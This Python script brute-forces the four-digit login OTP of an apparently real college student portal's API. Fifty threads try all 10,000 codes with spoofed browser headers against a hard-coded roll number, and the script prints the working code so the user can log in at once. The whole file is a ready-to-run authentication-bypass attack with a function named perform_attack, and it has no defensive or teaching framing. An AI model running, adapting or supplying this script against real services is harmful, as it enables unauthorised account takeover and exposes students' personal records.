import requests
import concurrent.futures
import colorama
from colorama import init, Fore, Style
import time

init(autoreset=True)

print(f"{Fore.YELLOW} ________        __                __                      __           ")
print(f"{Fore.YELLOW}/        |      /  |              /  |                    /  |          ")
print(f"{Fore.YELLOW}$$$$$$$$/   ____$$ | __   __   __ $$/   _______   ______  $$ | __    __ ")
print(f"{Fore.YELLOW}$$ |__     /    $$ |/  | /  | /  |/  | /       | /      \ $$ |/  |  /  |")
print(f"{Fore.YELLOW}$$    |   /$$$$$$$ |$$ | $$ | $$ |$$ |/$$$$$$$/ /$$$$$$  |$$ |$$ |  $$ |")
print(f"{Fore.YELLOW}$$$$$/    $$ |  $$ |$$ | $$ | $$ |$$ |$$      \ $$    $$ |$$ |$$ |  $$ |")
print(f"{Fore.YELLOW}$$ |_____ $$ \__$$ |$$ \_$$ \_$$ |$$ | $$$$$$  |$$$$$$$$/ $$ |$$ \__$$ |")
print(f"{Fore.YELLOW}$$       |$$    $$ |$$   $$   $$/ $$ |/     $$/ $$       |$$ |$$    $$ |")
print(f"{Fore.YELLOW}$$$$$$$$/  $$$$$$$/  $$$$$/$$$$/  $$/ $$$$$$$/   $$$$$$$/ $$/  $$$$$$$ |")
print(f"{Fore.YELLOW}                                                              /  \__$$ |")
print(f"{Fore.YELLOW}                                                              $$    $$/ ")
print(f"{Fore.YELLOW}                                                               $$$$$$/ ")

print("   \n                                      \033[95m(-Developed by <Solitary>)\033[0m")

print(f"{Fore.RED}\033[1mBefore running this Application,\033[0m")
print(f"{Fore.RED}Make sure to visit the website, Enter your register number and Click <Login using OTP> in the next page.")
print(f"{Fore.RED}Let this project find out the OTP for you.")
print(f"{Fore.RED}After the program gives out the correct OTP, Immediately login with it.")
print(f"{Fore.RED}Since the OTP is valid only for 10 minutes.")

url = 'https://dbchangesstudent.edwisely.com/auth/v3/getUserDetails'

params = {
    'roll_number': '111723104080',
    'otp': ''
}

headers = {
    'Sec-Ch-Ua': '"Brave";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'Accept': 'application/json, text/plain, */*',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Gpc': '1',
    'Accept-Language': 'en-US,en;q=0.5',
    'Origin': 'https://nextgen.rmkec.ac.in',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://nextgen.rmkec.ac.in/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Priority': 'u=1, i',
    'Connection': 'close'
}

def perform_attack():
    num_workers = 50  
    num_otp_per_thread = (10000 + num_workers - 1) // num_workers

    correct_otps = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        future_to_range = {}
        for i in range(0, 10000, num_otp_per_thread):
            end = min(i + num_otp_per_thread, 10000)
            future = executor.submit(check_otp_range, i, end)
            future_to_range[future] = (i, end)

        for future in concurrent.futures.as_completed(future_to_range):
            try:
                result = future.result()
                if result:
                    correct_otps.append(result)
                    if len(correct_otps) == 2:
                        print(f"\n{Fore.GREEN}OTP found: {correct_otps[1]}")
                        break
            except Exception as e:
                print(f"{Fore.RED}Exception: {e}")

def check_otp_range(start, end):
    for i in range(start, end):
        otp = f'{i:04}'
        params['otp'] = otp
        try:
            response = requests.get(url, params=params, headers=headers, verify=True)
            if response.status_code == 200 and len(response.text) > 1000:  
                return otp
        except requests.RequestException as e:
            print(f"{Fore.RED}Request failed for OTP {otp}: {e}")

    return None

perform_attack()

while True:
    time.sleep(1)


    
